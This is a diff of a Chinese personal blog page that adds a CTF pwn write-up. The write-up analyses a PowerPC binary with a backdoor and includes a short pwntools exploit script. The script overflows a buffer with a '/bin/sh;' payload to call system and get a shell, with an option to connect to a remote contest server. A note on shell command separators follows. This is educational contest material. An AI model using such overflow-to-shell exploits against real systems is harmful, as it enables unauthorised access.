@@ -10,7 +10,7 @@
         <link rel="stylesheet" href="/css/cursor.min.css">
         <script src="/js/cursor.min.js"></script>
         <meta charset="UTF-8" />
-        <title>标签 | niky&#39;s Blog</title>
+        <title>2023数字人才_pwn复现 | niky&#39;s Blog</title>
         <meta name="author" content="enicky" />
         <meta name="description" content="一个懵懂小孩的小房间" />
         <meta name="keywords" content="" />
@@ -41,6 +41,12 @@
 <script src="/js/lib/preview.js"></script>
 
 
+
+
+
+
+
+<script src="https://cdn.staticfile.org/twikoo/1.6.10/twikoo.all.min.js"></script>
 
 
 
@@ -151,22 +157,105 @@
     </div>
 </nav>
 
-                <div id="archives">
-    
-    <div class="categories-tags">
+                <div class="article">
+    <div>
+        <h1>2023数字人才_pwn复现</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/3/29
+        </span>
         
-        
-        <span>
-            <a href="/tags/CTF-PWN/" style="background: #00a596">
+        <span class="category">
+            <a href="/categories/CTF%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/">
                 <span class="icon">
-                    <i class="fa-solid fa-tags fa-fw"></i>
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
                 </span>
-                CTF PWN
+                CTF赛题复现
+
             </a>
         </span>
         
         
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/CTF-PWN/" style="color: #00bcd4">CTF PWN</a>
+            </span>
+            
+        </span>
+        
     </div>
+    
+    <div class="content" v-pre>
+        <p>简单的复现一下前段时间的2023数字人才的那一道pwn题，在比赛的过程还是没有静下心来思考。复现的时候才发现原来这道题目不是很难。</p>
+<p>查看一下保护咯，观察到和一般的pwn题附件不一样的格式，开了canary和NX（虽然没点影响体现），注意到是大端存储。</p>
+<p>![](X:\桌面记录文件夹\学习记录\内容收集\Snipaste_2023-03-29_19-21-14.png</p>
+<p><img src="/post_images/Snipaste_2023-03-29_19-27-55.png" alt="imag">拖入ida查看一下程序（伪代码）基本过程，复现的过程才明白malloc函数是分配一段内存空间（堆上面的），因此v5里面指向的就是堆的地址咯。再看第二处和read函数结合起来就明白第二处是将我们所输入的数据复制到v5指向的地址（堆里面咯）。最后看到第三处，直接转到堆里面了。<img src="/%E3%80%81post_images%E3%80%81Snipaste_2023-03-29_19-21-14.png" alt="imag"></p>
+<p>通过观察正好发现有backdoor存在，看到箭头指向的可以发现如果我们让v2存放了需要的<strong>“&#x2F;bin&#x2F;sh”</strong>参数，在backdoor执行结束就获得权限了。</p>
+<p><img src="/post_images/Snipaste_2023-03-29_19-29-21.png" alt="imag"></p>
+<p><img src="/post_images/Snipaste_2023-03-29_19-58-12.png" alt="imag"></p>
+<p>再看system的参数传递和第一次我们输入的过程（read函数），正好我们第一次输入的数据可以操控到system参数传递的<strong>r3寄存器</strong>。于是，题目就直接白给了，我们只需要通过第一次的输入将所需参数输入就可以打通了。</p>
+<p><img src="/post_images/Snipaste_2023-03-29_19-58-21.png" alt="imag"></p>
+<pre><code class="python">#coding=utf-8
+from pwn import *
+context(log_level=&#39;debug&#39;)
+context.arch = &quot;powerpc&quot;
+context.endian = &quot;big&quot;
+binary=&#39;./main&#39;
+#main_arena = 
+s = lambda buf: io.send(buf)
+sl = lambda buf: io.sendline(buf)
+sa = lambda delim, buf: io.sendafter(delim, buf)
+sal = lambda delim, buf: io.sendlineafter(delim, buf)
+shell = lambda: io.interactive()
+r = lambda n=None: io.recv(n)
+ra = lambda t=tube.forever:io.recvall(t)
+ru = lambda delim: io.recvuntil(delim)
+rl = lambda: io.recvline()
+rls = lambda n=2**20: io.recvlines(n)
+su = lambda buf,addr:io.success(buf+&quot;==&gt;&quot;+hex(addr))
+local = 1
+if local == 1:
+    io=process(binary)
+else:
+    io=remote(&#39;139.155.86.233&#39;,9999)
+
+
+pay = b&#39;/bin/sh;&#39;#分号不能忘记
+s(pay.ljust(0x28,b&#39;a&#39;)+p32(0x100006f0))#直接到system地址就可以
+
+
+shell()
+</code></pre>
+<blockquote>
+<p>在用linux命令时候， 我们经常需要同时执行多条命令， 那么命令之间该如何分割呢？</p>
+<pre><code>  分号： 顺序地独立执行各条命令， 彼此之间不关心是否失败， 所有命令都会执行。
+
+  &amp;&amp;  ： 顺序执行各条命令， 只有当前一个执行成功时候， 才执行后面的。
+
+    ||   ： 顺序执行各条命令， 只有当前面一个执行失败的时候， 才执行后面的。
+</code></pre>
+</blockquote>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    <div id="comment">
+        <div id="twikoo-container"></div>
+    </div>
+    
     
 </div>
 
@@ -199,6 +288,22 @@
             
         </div>
         <script src="/js/main.js"></script>
+        
+        
+
+
+
+<script>
+    twikoo.init({
+        el: "#twikoo-container",
+        envId: "",
+        region: "",
+        path: location.pathname,
+        lang: "zh-CN",
+    })
+</script>
+
+
         
     </body>
 </html>
